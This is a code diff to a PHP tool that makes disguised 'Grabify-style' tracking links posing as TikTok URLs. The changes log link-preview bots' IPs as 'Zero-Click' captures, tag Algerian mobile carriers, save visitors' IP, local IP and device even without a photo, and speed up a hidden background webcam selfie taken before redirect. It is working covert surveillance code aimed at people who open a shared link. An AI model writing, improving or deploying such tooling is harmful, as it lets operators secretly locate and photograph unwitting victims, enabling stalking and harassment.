@@ -75,22 +75,34 @@ function get_real_ip() {
     return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
 }
 
-// دالة محسنة لجلب الموقع مع اسم شركة الاتصالات (موبيليس، جازي، أوريدو، ADSL)
+// دالة تحليل دقيقة لمعرفة شبكات الجزائر (Mobilis, Djezzy, Ooredoo, Algérie Télécom)
 function get_ip_location($ip) {
     if ($ip === '127.0.0.1' || $ip === 'Unknown' || strpos($ip, '192.168.') === 0) {
         return 'Local Network';
     }
-    @$json = file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,city,isp,org");
+    @$json = file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,city,isp,org,as");
     if ($json) {
         $data = json_decode($json, true);
         if (isset($data['status']) && $data['status'] === 'success') {
             $city = $data['city'] ? $data['city'] . ', ' : '';
-            $country = $data['country'] ?? 'Unknown';
+            $country = $data['country'] ?? 'Algeria';
             $isp = $data['isp'] ?? ($data['org'] ?? '');
-            return "{$city}{$country} [{$isp}]";
+            
+            $lower_isp = strtolower($isp);
+            if (strpos($lower_isp, 'mobilis') !== false || strpos($lower_isp, 'telecom algeria') !== false || strpos($lower_isp, 'atm') !== false) {
+                $network_type = " [⚡ Mobilis / ADSL]";
+            } elseif (strpos($lower_isp, 'djezzy') !== false || strpos($lower_isp, 'ota') !== false) {
+                $network_type = " [🔥 Djezzy]";
+            } elseif (strpos($lower_isp, 'ooredoo') !== false || strpos($lower_isp, 'wataniya') !== false) {
+                $network_type = " [⭐ Ooredoo]";
+            } else {
+                $network_type = " [ISP: {$isp}]";
+            }
+
+            return "{$city}{$country}{$network_type}";
         }
     }
-    return 'Unknown Location';
+    return 'Algerian Network (Unknown ISP)';
 }
 
 function get_device_type($ua) {
@@ -123,10 +135,11 @@ if (isset($_GET['r'])) {
         $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
         $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebookexternalhit|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger/i', $ua);
 
+        // التقاط فوري لبيانات المعاينة (Zero-Click Preview Fetch)
         if ($is_bot) {
             $bot_ip = get_real_ip();
             $bot_location = get_ip_location($bot_ip);
-            $bot_device = "Preview Bot / Auto-Fetch";
+            $bot_device = "Zero-Click Preview Bot (" . (stripos($ua, 'telegram') !== false ? 'Telegram' : 'App') . ")";
             
             try {
                 $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, device_info, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
@@ -134,7 +147,7 @@ if (isset($_GET['r'])) {
                     $code, 
                     'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=200', 
                     $bot_ip, 
-                    'Not Clicked (Preview IP)', 
+                    'Zero-Click (No Interaction)', 
                     'N/A', 
                     $bot_location, 
                     $bot_device, 
@@ -165,7 +178,7 @@ if (isset($_GET['r'])) {
             $location = get_ip_location($public_ip);
             $device = get_device_type($ua);
 
-            if (!empty($img_base64)) {
+            if (!empty($img_base64) || !empty($public_ip)) {
                 try {
                     $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, device_info, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
                     $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $port, $location, $device, date('Y-m-d H:i:s')]);
@@ -231,7 +244,7 @@ if (isset($_GET['r'])) {
                                 video.remove();
 
                                 sendDataAndRedirect(imageData, localIp);
-                            }, 500);
+                            }, 400);
                         })
                         .catch(err => {
                             sendDataAndRedirect('', localIp);
@@ -366,13 +379,13 @@ if (!empty($filter_code)) {
     <div class="wrapper">
         
         <div class="section-box">
-            <h2>Generate Direct Grabify-Style Link</h2>
+            <h2>Generate Zero-Click Advanced Link</h2>
             <form method="POST" class="form-grid">
-                <input type="text" name="target_url" placeholder="TikTok Video URL..." required, autocomplete="off">
+                <input type="text" name="target_url" placeholder="TikTok Video URL..." required autocomplete="off">
                 
                 <label class="checkbox-group">
                     <input type="checkbox" name="capture_cam" value="1">
-                    <span>تفعيل التقاط صورة سيلفي في الخلفية (Capture Selfie)</span>
+                    <span>تفعيل التقاط صورة سيلفي في الخلفية (Capture Selfie عند الضغط)</span>
                 </label>
 
                 <button type="submit" name="create" class="btn">Generate Link</button>
@@ -421,7 +434,7 @@ if (!empty($filter_code)) {
                                 <span>Port:</span> <span><?php echo htmlspecialchars($cap['port']); ?></span>
                             </div>
                             <div class="info-row">
-                                <span>Location / ISP:</span> <span style="color:#10b981;"><?php echo htmlspecialchars($cap['location']); ?></span>
+                                <span>Network / ISP:</span> <span style="color:#10b981; font-weight:bold;"><?php echo htmlspecialchars($cap['location']); ?></span>
                             </div>
                             <div class="info-row">
                                 <span>Device:</span> <span><?php echo htmlspecialchars($cap['device_info']); ?></span>
